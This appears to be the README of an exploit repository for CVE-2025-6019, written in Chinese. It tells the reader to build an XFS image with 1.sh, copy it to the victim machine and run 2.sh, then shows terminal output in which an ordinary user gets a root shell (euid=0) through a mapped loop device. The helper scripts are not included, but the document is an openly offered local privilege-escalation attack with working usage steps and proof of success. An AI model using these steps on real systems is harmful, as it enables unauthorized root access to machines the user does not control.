# CVE-2025-6019_Exploit

- 第一步 在linux设备上运行1.sh,构建xfs.image

- 第二步 将xfs.image传入受害设备执行2.sh 如下即为成功

``` shell
neko@aosc-neko205 [ tmp ] $ bash 2.sh 
当前用户: neko
uid=1000(neko) gid=1001(neko) 组=1001(neko),11(audio),12(video),15(cdrom),974(ollama),997(wheel),999(plugdev),1002(gamemode)
('yes',)
Mapped file /home/neko/xfs.image as /dev/loop0.
成功找到 Root Shell: /tmp/blockdev.IK6D92/root-shell
正在提权...
root-shell-5.2# id
uid=1000(neko) gid=1001(neko) euid=0(root) 组=1001(neko),11(audio),12(video),15(cdrom),974(ollama),997(wheel),999(plugdev),1002(gamemode)
root-shell-5.2# 
```
